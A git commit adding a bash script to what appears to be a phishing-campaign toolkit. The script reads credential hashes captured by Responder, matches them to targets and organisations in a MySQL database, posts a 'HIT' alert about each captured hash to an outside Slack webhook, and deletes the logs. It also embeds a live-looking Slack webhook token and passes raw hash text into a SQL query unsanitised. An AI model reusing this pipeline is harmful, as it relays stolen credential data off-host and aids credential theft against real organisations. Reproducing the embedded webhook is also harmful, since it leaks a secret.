db0cae7d3fb36c73b6bcd4cb8138008a203fbe56
Curtis Brazzell <curtbraz@gmail.com>
2018-09-12 23:17:19 -0400

    Create phishinghashes.sh

---
+++ phishingdocs/phishinghashes.sh
@@ -0,0 +1,38 @@
+#!/bin/bash
+
+SlackURL="https://hooks.slack.com/services/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"
+SlackChannel="#phishing"
+APIResultsURL="https://authportals.com/phishingdocs/results"
+
+files=$(cd /home/ubuntu/Responder/logs && ls *.txt | awk '{print $1}');
+
+IFS='
+'
+count=0
+for item in $files
+do
+  file=$item
+  count=$((count+1))
+  IP=$(echo $item | cut -d "-" -f 4 | cut -d "." -f 1,2,3,4);
+  Module=$(echo $item | cut -d "-" -f 3);
+  HashType=$(echo $item | cut -d "-" -f 2);
+
+  Hashes=$(cat /home/ubuntu/Responder/logs/$file);
+
+  Query=$(mysql -u root phishingdocs -se "CALL MatchHashes('$IP','$Hashes');");
+
+  Target=$(echo $Query | cut -f 1);
+  Org=$(echo $Query | cut -f 2);
+
+  message=$(echo "> *HIT!!* Captured a" $HashType "hash ("$Module") for" $Target "at" $Org "(<"$APIResultsURL"|"$IP">)");
+
+  if [ -z "$Target" ] || [ -z "$Org" ]
+  then
+      message=$(echo "> Captured an out of scope" $HashType "hash ("$Module") at" $IP);
+  fi
+
+  curl -s -X POST --data-urlencode 'payload={"channel": "'$SlackChannel'", "username": "HashBot", "text": "'$message'", "icon_emoji": ":hash:"}' $SlackURL
+
+  rm /home/ubuntu/Responder/logs/$file;
+
+done
